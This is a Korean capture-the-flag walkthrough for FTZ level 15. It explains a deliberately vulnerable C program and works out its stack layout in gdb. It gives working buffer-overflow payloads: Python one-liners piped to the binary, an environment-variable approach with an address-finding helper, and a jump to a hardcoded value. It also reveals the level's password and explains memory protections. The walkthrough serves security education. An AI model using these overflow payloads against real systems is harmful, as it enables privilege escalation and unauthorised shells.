# FTZ 15  
## 문제 설명  
attackme 프로그램을 공격하자. attackme 소스코드는 hint에 적혀있다. 소스코드는 아래와 같다.  
```
#include <stdio.h>

main()
{
  int crap;
  int *check;
  char buf[20];
  fgets(buf,45,stdin);
  if (*check==0xdeadbeef){
    setreuid(3096,3096);
    system("/bin/sh");
  }
}
```  
attackme 파일의 소유자는 level16이다.  
따라서 if문을 만족시켜 ruid와 euid를 set시키고 쉘을 실행시키면 될 것 같다.  

## 문제 풀이  
1. level14문제와 유사하지만 check가 포인터라는 점에서 차이를 보인다.  
우선 gdb를 사용해 스택구조부터 파악해보자.

* ```sub esp, 0x38``` : 가용스택 0x38(56byte)  
* ```lea eax, [ebp-56]``` : buf를 입력받고 있다. 그리고 이건 fgets의 인자로 들어가니 뒤에 ```call <fgets>```가 오는 걸 볼 수 있다.  
* 
```
mov eax, DWORD PTR [ebp-16]
cmp DWORD PTR [eax], 0xdeadbeef
```  
[ebp-16] 에 *check가 있는 것을 알 수 있다. mov를 통해 check가 **가리키고있는 값**을 eax에 담는다. 그리고 그걸 하드코딩한 0xdeadbeef와 비교하는 if문의 어셈블리어다. (참고로 level14는 check의 값 그 자체를 0xdeadbeef와 비교했다. 지금 check는 포인터기 때문에 check는 주소를 담고 있을 거다. *check는 check가 담고있는 주소가 가리키는 값)  

* ```jne 0x80484dd <main+77>``` : jump not equal, if문 만족하지 않으면 main+77 즉 함수 에필로그하면서 프로그램 종료  
*
```
sub esp,0x8
push 0xc18
push 0xc18
call <setreuid>
```  
setreuid 함수를 호출하기 앞서 3096의 값을 지닌 인자들을 스택에 저장하고 함수를 호출한다.  
* ```call <system>``` : 이걸 보아하니 RTL 기법도 쓸 수 있을 것 같다.  

2. 따라서 스택 구조는 아래와 같다. 어떻게 알았는지는 level14 참고  

|ret|
|:---:|
|sfp [4]|
|dummy [8]|
|crap [4]|
|check [4]|
|dummy [20]|
|buf [20]|  

스택구조를 파악하기 위해서 level14에서 썼던 distance.c 코드를 실행해도 되지만, 간단하게 다른 방법으로 해보겠다. 바로 헷갈리는 check, crap, sfp 사이의 더미를 정확히 파악하기 위해 crap에 값을 집어넣어 보는 것이다!  
```
#include <stdio.h>

main()
{
  int crap = 1;
  int *check;
  char buf[20];
  fgets(buf,45,stdin);
  if (*check==0xdeadbeef){
    setreuid(3096,3096);
    system("/bin/sh");
  }
}
```  
그 후 gdb를 돌리면
```
mov DWORD PTR [ebp-12], 0x1
```  
이런 어셈블리를 발견할 수 있는데, 즉 crap이 [ebp-12] 위치에 존재한다는 뜻이 된다. 1을 값으로 가지는건 선언한 변수 중에 crap 뿐이므로.  


3. 공격을 어떻게할지 생각해보자!  
버퍼에 0xdeadbeef를 넣고 check에 주소를 넣어줘도 되고,  
환경변수에 0xdeadbeef를 넣고 check에 주소를 넣어줘도 된다.  


Buf에 직접 0xdeadbeef를 올리는 방법의 경우에는 (python -c 'print "\xef\xbe\xad\xde"+"A"*36+"Buf의시작주소"';cat) | ./attackme 나  
"\x90"을 이용한것과 같이 다양하게 조합하여 공격을 할 수가 있으나,  
우리 환경에는 ASLR이라는 메모리 보호기법이 걸려있기 때문에 버퍼에 넣어서 하기는 매우 힘들다.  

이론은 모두 동일하다. check 부문에 값을 넣어줘야하므로, 40byte는 nop으로 채우고 그 후에 check에 넣을 값을 리틀엔디안으로 넣으면 된다.  
즉, dummy[40] + check[4]  

* 환경변수를 이용하기  
환경변수에 0xdeadbeef 값을 넣어주는 것이다.  
```
export SHELL=$(python -c 'print "\xef\xbe\xad\xde"')
```  
그리고 이 환경변수의 주소를 알아내서 check에 넣어주면 된다!  
```
// getshell.c

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[1]){
	char *env;
	printf("address = %p\n",getenv("SHELL"));
	return 0;
}
```  
```
gcc -o getshell getshell.c
./getshell
```  
```
(pythonc -c 'print "A"*40 + "(리틀엔디안으로 shell 주소 넣기)"'; cat) | ./attackme
```


* 0xdeadbeef가 적혀있는 **주소**를 check에 넣기  
하드코딩이란 코딩 시에 그 숫자나 문자열이 그대로 입력되어있는 것으로 이러한 방법을 통하여 공격할 수 있다는 것을 유의해야한다.  
우선 0xdeadbeef가 어디에 저장되어 있는지 알아야한다.  
```
(gdb) x/10 main+32	// main+32 함수로부터 10 byte 출력, main+29에서 0xdeadbeef를 하드코딩하고 있으므로 그 이후 메모리에 있을 것이다.
```  
<img width="454" alt="5" src="https://user-images.githubusercontent.com/46364778/89117556-9c178400-d4d9-11ea-88c2-339559a32833.PNG">  

저기 빨간색 밑줄 부분을 보면 ```0x80484b0``` 주소근처에 0xdeadbeef가 있는걸 알 수 있다.  
정확한 주소를 찾아내보자.  
<img width="188" alt="6" src="https://user-images.githubusercontent.com/46364778/89117644-6f17a100-d4da-11ea-87ee-c0a11527961e.PNG">  

```0x80484b2```에 0xdeadbeef가 정확히 들어가있음을 알 수 있다!!!  

```
(python -c 'print "\x90"*40 + "\xb2\x84\x04\x08"';cat) | ./attackme
```  

4. level16 권한으로 쉘을 열 수 있고 my-pass 명령어를 통해 비밀번호를 알아낼 수 있다. 비밀번호는 "about to cause mass"  


## 그 외  
### 버퍼오버플로우 보호 기법  
1. **DEP(Data Execution Protection) / NX(None eXecute) bit**  
* heap과 stack 같이 bof 공격에 이용되는 메모리 공간에 있는 코드를 실행시키지 않는 기법  
* NX 비트를 활성화 시켜 스택/힙 영역의 실행 권한을 제거하여 쉘의 실행을 방지하는 기법  
* 이 보호 기법에 대한 우회 기법으로 RTL(Return To Library), ROP(Return Oriented Programming)이 있다.  
* NX bit 설정 확인 명령어: ```demesg | grep NX```  

2. **ASLR(Address Space Layout Randomize)**    
* *실행할 때 마다* 각 프로세스 안의 스택이 임의의 주소에 위치하도록 하는 기법  
* ASLR 설정 확인 명령어: ```cat/proc/sys/kerel/ramdomize_va_space```  
* 설정값 = 2: 랜덤 라이브러리 / 랜덤 스택 / 랜덤 힙  
* 설정값 = 1: 랜덤 라이브러리 / 랜덤 스택  
* 설정값 = 0: ASLR 해제  
* ASLR 적용 확인 명령어: ```cat/proc/self/maps | grep stack```  

3. **Stack Canary**  
* 스택에 카나리(canary)라는 값을 넣어서 이 값이 변조되었는지 검사하여 버퍼 오버플로우가 발생하였는지 검사하는 기법  
* 카나리 종류  
-Terminator Canary : NULL(0x0)이나 CR(0xd), LF(0xa), EOF(0xff)  
-Random Canary : Terminator Canary같이 공격자가 Canary 값을 알고 우회하는 것을 방지하기 위해서 랜덤하게 생성한 값  
-Random XOR Canary : Random Canary 처럼 랜덤하게 Canary 값을 생성하고 스택의 제어 부분을 사용해서 XOR을 포함한 값  

4. **ASCII-Armor**  
* 라이브러리 함수(Libc)의 상위 주소에 \x00인 NULL 바이트를 삽입하는 기법  
* RTL 공격에 대응하기 위한 방법으로 공격자가 라이브러리를 호출하는 bof 공격을 해도 null 바이트가 삽입된 주소로는 접근할 수 없다.  

[출처1](https://blog.naver.com/PostView.nhn?blogId=is_king&logNo=221569884316&proxyReferer=https:%2F%2Fwww.google.com%2F)
[출처2](https://bpsecblog.wordpress.com/2016/05/16/memory_protect_linux_1/)


